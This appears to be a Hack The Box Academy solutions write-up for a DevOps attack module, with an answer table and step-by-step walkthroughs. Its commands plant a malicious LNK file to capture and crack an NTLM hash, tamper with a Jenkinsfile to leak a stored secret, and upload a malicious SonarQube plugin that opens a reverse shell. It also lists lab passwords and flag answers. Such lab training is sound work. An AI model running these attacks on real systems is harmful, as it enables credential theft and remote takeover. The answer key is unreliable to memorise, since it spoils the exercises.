

| Section               | Question Number | Answer                                                                                                                           |
| --------------------- | --------------- | -------------------------------------------------------------------------------------------------------------------------------- |
| Insider Threat Attack | Question 1      | SmtP@123                                                                                                                         |
| DevOps Not-So-Secrets | Question 1      | HTB{VULNERABLE\_CI/CD}                                                                                                           |
| Testing the Tester    | Question 1      | HTB{PwnrQube\_00ps}                                                                                                              |
| Skills Assessment     | Question 1      | 6022f124545afbdac965cc8178712e00b2937c09c75999a8fd62cca428f65b2aff7a0ed0a885d7d2f44225f9e3f3347516a15bbf8fa4c93a77bcb0d9ea725945 |

## Acronyms Used in Writeups

| Acronym | Meaning |
| --- | --- |
| STMIP | Spawned Target Machine IP Address |
| STMPO | Spawned Target Machine Port |
| PMVPN | Personal Machine with a Connection to the Academy's VPN |
| PWNIP | Pwnbox IP Address (or PMVPN IP Address) |
| PWNPO | Pwnbox Port (or PMVPN Port) |

# Insider Threat Attack

## Question 1

### "What is the SMTP Server password in the creds.ps1 powershell script on the desktop of the target system"

Students need to spawn the target machine and use the provided credentials `htb-student`:`HTB_@cademy_stdnt!`. Subsequently, students need to use the tool `smbmap` to list the shares on the spawned target. Alternatively, they can use tools like `smbclient` and `crackmapexec`.

Code: shell

```shell
smbmap -H SMTIP -u 'HTB-student' -p 'HTB_@cademy_stdnt!'
```

```
┌─[eu-academy-1]─[10.10.14.66]─[htb-ac-1008@htb-yq9zfr4swf]─[~]
└──╼ [★]$ smbmap -H 10.129.228.187 -u 'htb-student' -p 'HTB_@cademy_stdnt!'
[+] IP: 10.129.228.187:445	Name: 10.129.228.187                                    
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	Development Share                                 	READ, WRITE	
	IPC$                                              	READ ONLY	Remote IPC
	ShareName                                         	NO ACCESS	SMB Share
```

Students will notice the `READ, WRITE` permissions on the `Delevopment Share`, meaning that they are able to list the contents of the share and also write files to that share. Subsequently, students will have to use the `slinky` module in CrackMapExec, which will automatically verify the accessible shares and will place a malicious `lnk` file, and it will automatically force authentication to a machine that has `Responder` running. They will have to use the aforementioned module in CrackMapExec followed by specifying the options such as `SERVER=PWNIP` and `NAME=<filename>`.

Code: shell

```shell
crackmapexec smb STMIP -u htb-student -p 'HTB_@cademy_stdnt!' -M slinky -o SERVER=PWNIP NAME=test
```

```
┌─[eu-academy-1]─[10.10.14.66]─[htb-ac-1008@htb-yq9zfr4swf]─[~]
└──╼ [★]$ crackmapexec smb 10.129.228.187 -u htb-student -p 'HTB_@cademy_stdnt!' -M slinky -o SERVER=10.10.14.66 NAME=test
[!] Module is not opsec safe, are you sure you want to run this? [Y/n] y
SMB         10.129.228.187  445    WIN-41LARS8U72P  [*] Windows Server 2016 Standard 14393 x64 (name:WIN-41LARS8U72P) (domain:WIN-41LARS8U72P) (signing:False) (SMBv1:True)
SMB         10.129.228.187  445    WIN-41LARS8U72P  [+] WIN-41LARS8U72P\htb-student:HTB_@cademy_stdnt! 
SLINKY      10.129.228.187  445    WIN-41LARS8U72P  [+] Found writable share: Development Share
SLINKY      10.129.228.187  445    WIN-41LARS8U72P  [+] Created LNK file on the Development Share share
```

After successfully placing the malicious lnk file, students need to start `Responder` in a separate terminal tab.

Code: shell

```shell
sudo responder -I tun0
```

```
─[eu-academy-1]─[10.10.14.66]─[htb-ac-1008@htb-yq9zfr4swf]─[~]
└──╼ [★]$ sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]
    
<SNIP>

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.66]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-EQA2UZDV0BA]
    Responder Domain Name      [7SO1.LOCAL]
    Responder DCE-RPC Port     [45088]
[!] Error starting TCP server on port 80, check permissions or other servers running.

[+] Listening for events...
```

After waiting for a minute or two, students will notice that `Responder` has captured the `Net-NTLMv2 SSP` hash of the Administrator user.

```
─[eu-academy-1]─[10.10.14.66]─[htb-ac-1008@htb-yq9zfr4swf]─[~]
└──╼ [★]$ sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]
    
<SNIP>

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.66]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-EQA2UZDV0BA]
    Responder Domain Name      [7SO1.LOCAL]
    Responder DCE-RPC Port     [45088]
[!] Error starting TCP server on port 80, check permissions or other servers running.

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.228.187
[SMB] NTLMv2-SSP Username : WIN-41LARS8U72P\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::WIN-41LARS8U72P:88096cf13cfe8b60:7B6E152220B8AD66A0A9BCC19A43743F:0101000000000000802CCEE3671CDA017BBBEF11211A106E0000000002000800370053004F00310001001E00570049004E002D00450051004100320055005A0044005600300042004<SNIP>
```

Subsequently, students must save the captured hash to a text file and use `hashcat` with mode `5600` to crack the hash using the `rockyou.txt` dictionary file.

Code: shell

```shell
hashcat -m 5600 Administrator.hash /usr/share/wordlists/rockyou.txt
```

```
┌─[eu-academy-1]─[10.10.14.66]─[htb-ac-1008@htb-yq9zfr4swf]─[~]
└──╼ [★]$ hashcat -m 5600 Administrator.hash /usr/share/wordlists/rockyou.txt 
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 LINUX) - Platform #1 [Intel(R) Corporation]
==================================================================
* Device #1: AMD EPYC 7543 32-Core Processor, 7854/7918 MB (1979 MB allocatable), 4MCU

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #2 [The pocl project]
=============================================================================================================================
* Device #2: pthread-AMD EPYC 7543 32-Core Processor, skipped

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 65 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

ADMINISTRATOR::WIN-41LARS8U72P:88096cf13cfe8b60:7b6e152220b8ad66a0a9bcc19a43743f:0101000000000000802ccee3671cda017bbbef11211a106e0000000002000800370053004f00310001001e00570049004e002d00450051<SNIP>:christian1
```

After cracking the passwords, students will discover that the plaintext password for the Administrator user is `christian1`. Subsequently, they will have to use `evil-winrm` to authenticate to the spawned target and grab the password located in the `creds.ps1` file on the Desktop.

Code: shell

```shell
evil-winrm -i STMIP -u Administrator -p christian1
type ../Desktop/creds.ps1
```

```
┌─[eu-academy-1]─[10.10.14.66]─[htb-ac-1008@htb-yq9zfr4swf]─[~]
└──╼ [★]$ evil-winrm -i 10.129.228.187 -u Administrator -p christian1

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> type ../Desktop/creds.ps1
{
    "Port":  587,
    "Username":  "smtp-dev",
    "Password":  "SmtP@123",
    "SmtpServer":  "smtp.inlanefreight.local"
}
```

Answer: `SmtP@123`

# DevOps Not-So-Secrets

## Question 1

### "What is the flag value?"

Students need to spawn the target machine and subsequently update their `/etc/host` file.

Code: shell

```shell
sudo tee -a /etc/hosts <<EOF
STMIP gitea.inlanefreight.local
STMIP jenkins.inlanefreight.local
EOF
```

```
┌─[eu-academy-1]─[10.10.14.66]─[htb-ac-1008@htb-yq9zfr4swf]─[~]
└──╼ [★]$ sudo tee -a /etc/hosts <<EOF
10.129.228.194 gitea.inlanefreight.local
10.129.228.194 jenkins.inlanefreight.local
EOF
10.129.228.194 gitea.inlanefreight.local
10.129.228.194 jenkins.inlanefreight.loca
```

Right after updating the `/etc/host` file accordingly, students need to visit `http://gitea.inlanefreight.local:3600` through Firefox. Students will be presented with the default Gitea landing page, from which they will have to navigate to the login page using the `Sign In` button at the top right corner.

![[HTB Solutions/Others/z. images/d1ae1f18670b521dc52ccd9952bc5a27_MD5.jpg]]

Students need to sign in using the credentials `htb-stdnt`:`Test@123`.

![[HTB Solutions/Others/z. images/5aa092d325f1d8e608f448acc4147400_MD5.jpg]]

Right after they have successfully logged in using the aforementioned credentials, students will be presented with information related to different actions for the repository `htb/app1`.

![[HTB Solutions/Others/z. images/fe21f2fd38864b8d6a040f7db955ce7f_MD5.jpg]]

Students will have to create a separate branch where they will place a tampered `Jenkinsfile`. They will have to clone the repository using `git`. Students will be prompted for credentials which are `htb-stdnt`:`Test@123` while cloning the repository locally.

Code: shell

```shell
git clone http://gitea.inlanefreight.local:3000/htb/app1
```

```
┌─[eu-academy-1]─[10.10.14.66]─[htb-ac-1008@htb-yq9zfr4swf]─[~]
└──╼ [★]$ git clone http://gitea.inlanefreight.local:3000/htb/app1
Cloning into 'app1'...
Username for 'http://gitea.inlanefreight.local:3000': htb-stdnt
Password for 'http://htb-stdnt@gitea.inlanefreight.local:3000': Test@123
remote: Enumerating objects: 21, done.
remote: Counting objects: 100% (21/21), done.
remote: Compressing objects: 100% (19/19), done.
remote: Total 21 (delta 6), reused 1 (delta 0)
Receiving objects: 100% (21/21), 11.79 KiB | 11.79 MiB/s, done.
Resolving deltas: 100% (6/6), done.
```

Once students have successfully cloned the `htb/app1` repository locally, they will need to change their current working directory to `app1/`, create a new branch using `git`, and switch to it.

Code: shell

```shell
cd app1/
git branch dev
git checkout-dev
```

```
┌─[eu-academy-1]─[10.10.14.66]─[htb-ac-1008@htb-yq9zfr4swf]─[~]
└──╼ [★]$ cd app1
┌─[eu-academy-1]─[10.10.14.66]─[htb-ac-1008@htb-yq9zfr4swf]─[~/app1]
└──╼ [★]$ git branch dev
┌─[eu-academy-1]─[10.10.14.66]─[htb-ac-1008@htb-yq9zfr4swf]─[~/app1]
└──╼ [★]$ git checkout dev
Switched to branch 'dev'
```

Students need to modify the contents of the `Jenkinsfile` using a text editor of their choice with the following:

```
pipeline { agent any

stages {
    stage('Install_Requirements') {
        steps {
            script {
                withCredentials([string(credentialsId: 'flag', variable: 'flag')]) {
                    def decodedFlag = sh(script: "echo \$flag | base64 -d", returnStatus: true)
                    if (decodedFlag == 0) {
                        echo "Decoded 'flag' value is: \$flag"
                    } else {
                        error "Failed to decode 'flag'"
                    }
                }
            }
        }
    }
}
}
```

The script above takes advantage of the `withCredentials` function and will try to get the flag variable through the `credenetialsId` string and will attempt to decode the flag.

Code: shell

```shell
cat Jenkinsfile
```

```
┌─[eu-academy-1]─[10.10.14.66]─[htb-ac-1008@htb-yq9zfr4swf]─[~/app1]
└──╼ [★]$ cat Jenkinsfile 
pipeline { agent any

stages {
    stage('Install_Requirements') {
        steps {
            script {
                withCredentials([string(credentialsId: 'flag', variable: 'flag')]) {
                    def decodedFlag = sh(script: "echo \$flag | base64 -d", returnStatus: true)
                    if (decodedFlag == 0) {
                        echo "Decoded 'flag' value is: \$flag"
                    } else {
                        error "Failed to decode 'flag'"
                    }
                }
            }
        }
    }
}
}
```

Right after changing the file's contents, students need to commit the changes using git.

Code: shell

```shell
git add .
git config --global user.email 'htb-stdnt'
git config --global user.name 'htb-stdnt'
git commit -m "Update"
git push --set-upstream origin dev
```

```
┌─[eu-academy-1]─[10.10.14.66]─[htb-ac-1008@htb-yq9zfr4swf]─[~/app1]
└──╼ [★]$ git add .
┌─[eu-academy-1]─[10.10.14.66]─[htb-ac-1008@htb-yq9zfr4swf]─[~/app1]
└──╼ [★]$ git config --global user.email 'htb-stdnt'
┌─[eu-academy-1]─[10.10.14.66]─[htb-ac-1008@htb-yq9zfr4swf]─[~/app1]
└──╼ [★]$ git config --global user.name 'htb-stdnt'
┌─[eu-academy-1]─[10.10.14.66]─[htb-ac-1008@htb-yq9zfr4swf]─[~/app1]
└──╼ [★]$ git commit -m "Update"
[dev ec31a80] Update
 1 file changed, 14 insertions(+), 23 deletions(-)
┌─[eu-academy-1]─[10.10.14.66]─[htb-ac-1008@htb-yq9zfr4swf]─[~/app1]
└──╼ [★]$ git push --set-upstream origin dev
Username for 'http://gitea.inlanefreight.local:3000': htb-stdnt
Password for 'http://htb-stdnt@gitea.inlanefreight.local:3000': Test@123
Enumerating objects: 5, done.
Counting objects: 100% (5/5), done.
Delta compression using up to 4 threads
Compressing objects: 100% (3/3), done.
Writing objects: 100% (3/3), 486 bytes | 486.00 KiB/s, done.
Total 3 (delta 1), reused 0 (delta 0), pack-reused 0
remote: 
remote: Create a new pull request for 'dev':
remote:   http://gitea.inlanefreight.local/htb/app1/compare/master...dev
remote: 
remote: . Processing 1 references
remote: Processed 1 references in total
To http://gitea.inlanefreight.local:3000/htb/app1
   d04782c..ec31a80  dev -> dev
branch 'dev' set up to track 'origin/dev'.
```

Students can verify the changes by visiting `http://gitea.inlanefreight.local:3000/htb/app1/src/branch/dev/Jenkinsfile`.

![[HTB Solutions/Others/z. images/7ca5ab4d75dbe2b55c41fa43c2eaf388_MD5.jpg]]

Once the students have verified the changes, they will have to visit the Jenkins application (`http://jenkins.inlanefreight.local:8086`) with the credentials `admin`:`c235899364c147f0ad586c4408b18765`.

![[HTB Solutions/Others/z. images/fa5f2ba271a7ce690ee7b38f626dc5c7_MD5.jpg]]

After logging in, students must visit `http://jenkins.inlanefreight.local:8086/job/htb/job/app1/`, where they will find two two repositories - `master` and `dev`.

![[HTB Solutions/Others/z. images/9af91ea533102174e0f4c74dfd5351c7_MD5.jpg]]

Students will notice that the `dev` branch has not been built yet. They must click on the arrow that appears upon hovering with the mouse over `dev` and click on `Build Now`.

![[HTB Solutions/Others/z. images/8b0944a5ad6c3f71dbc1046f06af7381_MD5.jpg]]

Subsequently, the students need to visit `http://jenkins.inlanefreight.local:8086/job/htb/job/app1/job/dev/` and scroll down a bit to see the information and hyperlink about the latest builds. They will have to click on the `Last build` hyperlink in the `Permalinks` section.

![[HTB Solutions/Others/z. images/7783498778c7a5fcfcfffe88caf79adf_MD5.jpg]]

Once redirected, students will see details about the build, including the `Console Output` feature. This feature provides information about the different stages of the build.

![[HTB Solutions/Others/z. images/789c2cf60d284c0ee49ceb5396e62185_MD5.jpg]]

Students will be presented with information about the latest build while also following the logic placed in the `Jenkinsfile`, which will provide them with the decoded flag.

![[HTB Solutions/Others/z. images/e61473048597577dce0aeff14e80df5c_MD5.jpg]]

Answer: `HTB{VULNERABLE_CI/CD}`

# Testing the Tester

## Question 1

### "What is the flag value?"

Students need to spawn the target machine and subsequently update their `/etc/host` file.

Code: shell

```shell
echo "STMIP sonarqube.inlanefreight.local" | sudo tee -a /etc/hosts
```

```
┌─[eu-academy-1]─[10.10.14.66]─[htb-ac-1008@htb-yq9zfr4swf]─[~/app1]
└──╼ [★]$ echo "10.129.228.197 sonarqube.inlanefreight.local" | sudo tee -a /etc/hosts
10.129.228.197 sonarqube.inlanefreight.local
```

Once updated, students need to visit `http://sonarqube.inlanefreight.local`, and upon carefully going through the landing page, they will notice that there is information containing the version and the build numbers, respectively. Students must attempt to use default username and password credentials, and they will come to know that the combination of `admin`:`admin` will succeed and get them administrative access.

![[HTB Solutions/Others/z. images/230f3c59e61bfd60b62fbcfa680bd558_MD5.jpg]]

Students will have to utilize the mentioned exploit in the section as it targets the version of SonarQube on the target - [https://github.com/braindead-sec/pwnrqube](https://github.com/braindead-sec/pwnrqube); they will have to clone the repository locally using `git clone`.

Code: shell

```shell
git clone https://github.com/braindead-sec/pwnrqube
```

```
┌─[eu-academy-1]─[10.10.14.66]─[htb-ac-1008@htb-yq9zfr4swf]─[~]
└──╼ [★]$ git clone https://github.com/braindead-sec/pwnrqube
Cloning into 'pwnrqube'...
remote: Enumerating objects: 19, done.
remote: Counting objects: 100% (19/19), done.
remote: Compressing objects: 100% (16/16), done.
remote: Total 19 (delta 2), reused 8 (delta 0), pack-reused 0
Receiving objects: 100% (19/19), 33.08 MiB | 9.15 MiB/s, done.
Resolving deltas: 100% (2/2), done.
```

Right after they have successfully cloned the repository above, students need to change their current working directory to `pwnrqube/totally-benign-plugin`.

Code: shell

```shell
cd pwnrqube/totally-benign-plugin
```

```
┌─[eu-academy-1]─[10.10.14.66]─[htb-ac-1008@htb-yq9zfr4swf]─[~]
└──╼ [★]$ cd pwnrqube/totally-benign-plugin
```

Once students have changed their current working directory to the above-mentioned, they must change the assigned in `src/main/java/benign.java` variable `String lhost` from `127.0.0.1` to their IP from the `tun0` interface.

Code: shell

```shell
sed -i 's/127.0.0.1/PWNIP/g' src/main/java/benign.java
```

```
┌─[eu-academy-1]─[10.10.14.66]─[htb-ac-1008@htb-yq9zfr4swf]─[~/pwnrqube/totally-benign-plugin]
└──╼ [★]$ sed -i 's/127.0.0.1/10.10.14.66/g' src/main/java/benign.java
```

After making the changes, students must run `mvn clean package`. This command will clean the package and will perform the necessary steps to build and package the project.

Code: shell

```shell
mvn clean package
```

```
─[eu-academy-1]─[10.10.14.66]─[htb-ac-1008@htb-yq9zfr4swf]─[~/pwnrqube/totally-benign-plugin]
└──╼ [★]$ mvn clean package
[INFO] Scanning for projects...
Downloading from central: https://repo.maven.apache.org/maven2/org/sonarsource/sonar-packaging-maven-plugin/sonar-packaging-maven-plugin/1.18.0.372/sonar-packaging-maven-plugin-1.18.0.372.pom

<SNIP>
[INFO] -------------------------------------------------------
[INFO] Plugin definition in update center
[INFO]     Key: benign
[INFO]     Name: benign
[INFO]     Description: Totally benign plugin

<SNIP>

[INFO] -------------------------------------------------------
[INFO] Building jar: /home/htb-ac-1008/pwnrqube/totally-benign-plugin/target/totally-benign-plugin-1.0.jar
[INFO] ------------------------------------------------------------------------
[INFO] BUILD SUCCESS
[INFO] ------------------------------------------------------------------------
```

Once students have completed the build process, they will utilize `curl` to upload the malicious package to the spawned target.

Code: shell

```shell
curl --user admin:admin -X POST -F file=@target/totally-benign-plugin-1.0.jar http://sonarqube.inlanefreight.local/api/updatecenter/upload
```

```
┌─[eu-academy-1]─[10.10.14.66]─[htb-ac-1008@htb-yq9zfr4swf]─[~/pwnrqube/totally-benign-plugin]
└──╼ [★]$ curl --user admin:admin -X POST -F file=@target/totally-benign-plugin-1.0.jar http://sonarqube.inlanefreight.local/api/updatecenter/upload
```

Subsequently, students need to open a new terminal tab where they will start a netcat listener on port 1337.

Code: shell

```shell
nc -nvlp 1337
```

```
┌─[eu-academy-1]─[10.10.14.66]─[htb-ac-1008@htb-yq9zfr4swf]─[~]
└──╼ [★]$ nc -nvlp 1337
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
```

Students must restart the SonarQube application in the other terminal tab by targeting the API.

Code: shell

```shell
curl --user admin:admin -X POST http://sonarqube.inlanefreight.local/api/system/restart
```

```
┌─[eu-academy-1]─[10.10.14.66]─[htb-ac-1008@htb-yq9zfr4swf]─[~/pwnrqube/totally-benign-plugin]
└──╼ [★]$ curl --user admin:admin -X POST http://sonarqube.inlanefreight.local/api/system/restart
```

A few seconds after the request, students will realize that a reverse shell has been established.

```
┌─[eu-academy-1]─[10.10.14.66]─[htb-ac-1008@htb-yq9zfr4swf]─[~]
└──╼ [★]$ nc -nvlp 1337
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.129.228.197.
Ncat: Connection from 10.129.228.197:60376.

id
uid=999(sonarqube) gid=999(sonarqube) groups=999(sonarqube)
```

They can attempt to upgrade their shell prompt utilizing the functionality of bash.

Code: shell

```shell
bash -i
```

```
┌─[eu-academy-1]─[10.10.14.66]─[htb-ac-1008@htb-yq9zfr4swf]─[~]
└──╼ [★]$ nc -nvlp 1337
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.129.228.197.
Ncat: Connection from 10.129.228.197:60376.

id
uid=999(sonarqube) gid=999(sonarqube) groups=999(sonarqube)
bash -i
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
sonarqube@sonarqube:/opt/sonarqube$ 
```

Having established a shell reverse session, students must `cat` the file from `/home/flag.txt`, presenting them with the flag.

Code: shell

```shell
cat /home/flag.txt
```

```
sonarqube@sonarqube:/opt/sonarqube$ cat /home/flag.txt
cat /home/flag.txt
HTB{PwnrQube_00ps}
```

Answer: `HTB{PwnrQube_00ps}`

# Skills Assessment

## Question 1

### "What is the secret\_key\_base in the secrets.yml file?"

Students need to spawn the target machine and subsequently download the `DocsDump.zip` archive from the resources.

Code: shell

```shell
wget https://academy.hackthebox.com/storage/modules/243/DocsDump.zip
```

```
┌─[eu-academy-1]─[10.10.14.66]─[htb-ac-1008@htb-9lu53uspvt]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/modules/243/DocsDump.zip
--2023-11-22 10:50:30--  https://academy.hackthebox.com/storage/modules/243/DocsDump.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.21.126, 104.18.20.126, 2606:4700::6812:147e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.21.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 59934 (59K) [application/zip]
Saving to: ‘DocsDump.zip’

DocsDump.zip        100%[===================>]  58.53K  --.-KB/s    in 0s      

2023-11-22 10:50:31 (226 MB/s) - ‘DocsDump.zip’ saved [59934/59934]
```

Right after, students need to unzip the archive using `unzip.`

Code: shell

```shell
unzip DocsDump.zip
```

```
┌─[eu-academy-1]─[10.10.14.66]─[htb-ac-1008@htb-9lu53uspvt]─[~]
└──╼ [★]$ unzip DocsDump.zip 
Archive:  DocsDump.zip
  inflating: Third-Party Disposal Company Vetting Checklist.xlsx  
   creating: Dismissals/
  inflating: Dismissals/NickAnderson.docx  
  inflating: InlaneFreight Hardware Disposal Policy.docx
```

They will come to know that the zip archive contains three files in total, in `docx` and `xlsx` formats. Students will need to install LibreOffice using `apt` in order to open the files.

Code: shell

```shell
sudo apt update
sudo apt install libreoffice
```

```
┌─[eu-academy-1]─[10.10.14.66]─[htb-ac-1008@htb-9lu53uspvt]─[~]
└──╼ [★]$ sudo apt update
Get:1 https://download.docker.com/linux/debian bullseye InRelease [43.3 kB]
Get:2 https://debian.neo4j.com stable InRelease [44.2 kB]                                                                  
Get:3 https://packages.microsoft.com/debian/10/prod buster InRelease [6,537 B]                                             
Get:4 https://repos.insights.digitalocean.com/apt/do-agent main InRelease [5,518 B]                                        
Get:5 https://download.docker.com/linux/debian bullseye/stable amd64 Packages [28.0 kB] 
Ign:6 https://repo.mongodb.org/apt/ubuntu focal/mongodb-org/6.0 InRelease    
Get:7 https://deb.parrot.sh/parrot parrot InRelease [14.6 kB]
<SNIP>

┌─[eu-academy-1]─[10.10.14.66]─[htb-ac-1008@htb-kp57ekkaho]─[~]
└──╼ [★]$ sudo apt install libreoffice
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following package was automatically installed and is no longer required:
  grub-pc-bin
Use 'sudo apt autoremove' to remove it.
<SNIP>
```

Students will need to review the files and will discover that one of the files holds information about the procedures implemented into the company and how they are stored. Upon examining the procedures, they will learn that the company has a procedure for storing disk image files, which follows a standardized naming convention, as outlined in the `InlaneFreight Hardware Disposal Policy.docx` file.

Code: shell

```shell
libreoffice 'InlaneFreight Hardware Disposal Policy.docx'
```

```
┌─[eu-academy-1]─[10.10.14.66]─[htb-ac-1008@htb-kp57ekkaho]─[~]
└──╼ [★]$ libreoffice 'InlaneFreight Hardware Disposal Policy.docx'
```

![[HTB Solutions/Others/z. images/8f54f95aa47d0cace5838148f02ad852_MD5.jpg]]

Students will have to download the disk image based on the information obtained from `DocsDump.zip`, which contains a dismissal document for `NickAnderson`.

Code: shell

```shell
wget http://STMIP/images/image_NickAnderson.img.gz
```

```
┌─[eu-academy-1]─[10.10.14.66]─[htb-ac-1008@htb-kp57ekkaho]─[~]
└──╼ [★]$ wget http://10.129.228.196/images/image_NickAnderson.img.gz
--2023-11-22 08:13:42--  http://10.129.228.196/images/image_NickAnderson.img.gz
Connecting to 10.129.228.196:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 6582689 (6.3M) [application/x-gzip]
Saving to: ‘image_NickAnderson.img.gz’

image_NickAnderson.img.gz          100%[===================================================================>]   6.28M  29.6MB/s    in 0.2s    

2023-11-22 08:13:42 (29.6 MB/s) - ‘image_NickAnderson.img.gz’ saved [6582689/6582689]
```

Subsequently, students will need to unzip the archive using `gunzip`.

Code: shell

```shell
gunzip image_NickAnderson.img.gz
```

```
┌─[eu-academy-1]─[10.10.14.66]─[htb-ac-1008@htb-kp57ekkaho]─[~]
└──╼ [★]$ gunzip image_NickAnderson.img.gz 
```

Right after, they will be presented with the disk image file `image_NickAnderson.img`.

Code: shell

```shell
ll image_NickAnderson.img
```

```
┌─[eu-academy-1]─[10.10.14.66]─[htb-ac-1008@htb-kp57ekkaho]─[~]
└──╼ [★]$ ll image_NickAnderson.img 
-rw-r--r-- 1 htb-ac-1008 htb-ac-1008 64M Nov 22 08:11 image_NickAnderson.img
```

Students will have to mount the image file using `mount` and then navigate to the directory the file was mounted to.

Code: shell

```shell
sudo mkdir /mnt/iso
sudo mount -o loop image_NickAnderson.img /mnt/iso
ls -l /mnt/iso
```

```
┌─[eu-academy-1]─[10.10.14.66]─[htb-ac-1008@htb-kp57ekkaho]─[~]
└──╼ [★]$ sudo mkdir /mnt/iso
┌─[eu-academy-1]─[10.10.14.66]─[htb-ac-1008@htb-kp57ekkaho]─[~]
└──╼ [★]$ sudo mount -o loop image_NickAnderson.img /mnt/iso
┌─[eu-academy-1]─[10.10.14.66]─[htb-ac-1008@htb-kp57ekkaho]─[~]
└──╼ [★]$ ls -l /mnt/iso
total 32
drwxr-xr-x  5 root root  4096 Nov 14 08:51 configs
drwxr-xr-x  2 root root  4096 Nov 14 13:52 emails
drwxr-xr-x  6 root root  4096 Nov 14 11:02 javascript-algorithms
drwx------  2 root root 16384 Nov 14 08:47 lost+found
drwxr-xr-x 11 root root  4096 Nov 14 11:03 src
```

Students will come to know that the disk image file contains a directory called `emails`, which holds information regarding different emails received by the user.

Code: shell

```shell
cd /mnt/iso/emails
```

```
┌─[eu-academy-1]─[10.10.14.66]─[htb-ac-1008@htb-kp57ekkaho]─[/mnt/iso/emails]
└──╼ [★]$ cd /mnt/iso/emails/
```

Subsequently, students will have to go through the emails. They will come to know that one of the emails holds information about a GitLab instance, including a username, password, and URI address.

Code: shell

```shell
ls -l
cat gitlab_welcome.eml
```

```
┌─[eu-academy-1]─[10.10.14.66]─[htb-ac-1008@htb-kp57ekkaho]─[/mnt/iso/emails]
└──╼ [★]$ ls -l
total 16
-rw-r--r-- 1 root root 465 Nov 14 08:55 bamboo_welcome.eml
-rw-r--r-- 1 root root 473 Nov 14 08:55 confluence_welcome.eml
-rw-r--r-- 1 root root 500 Nov 14 13:52 gitlab_welcome.eml
-rw-r--r-- 1 root root 461 Nov 14 08:55 jira_welcome.eml

┌─[eu-academy-1]─[10.10.14.66]─[htb-ac-1008@htb-kp57ekkaho]─[/mnt/iso/emails]
└──╼ [★]$ cat gitlab_welcome.eml 
From: HR Department <hr@inlanefreight.local>
To: New Employee <new.employee@inlanefreight.local>
Subject: Welcome to Inlane Freight - Your GitLab Onboarding

Welcome to Inlane Freight!

As a part of your onboarding process, you have been registered for GitLab.

Please find your login details below:
URI: gitlab-dev5.inlanefreight.local
Username: new.employee
Password: Welcome123!

It is highly recommended that you change your password upon your first login.

Best regards,
HR Department
Inlane Freight
```

Students will have to add the URI to their `/etc/hosts` file.

```
sudo sh -c 'echo STMIP gitlab-dev5.inlanefreight.local >> /etc/hosts'
```

```
┌─[eu-academy-1]─[10.10.14.66]─[htb-ac-1008@htb-k3xbe99mhx]─[~]
└──╼ [★]$ sudo sh -c 'echo 10.129.203.98 gitlab-dev5.inlanefreight.local >> /etc/hosts'
```

Subsequently, after adding the entry to their hosts file, students will navigate to the `gitlab-dev5.inlanefreight.local` instance. Here, they will attempt to log in using the previously found credentials, only to discover they are invalid. Students will then need to create a new account using the registration functionality.

![[HTB Solutions/Others/z. images/c2686d06ea6aad75c0002df788a22705_MD5.jpg]]

Right after students create an account, they will need to log in. Once they have successfully logged in, they should visit the `Help` page, as it contains information about the version of the running GitLab instance.

![[HTB Solutions/Others/z. images/802f1b4cc949fc4079d38ef50f5e6ffd_MD5.jpg]]

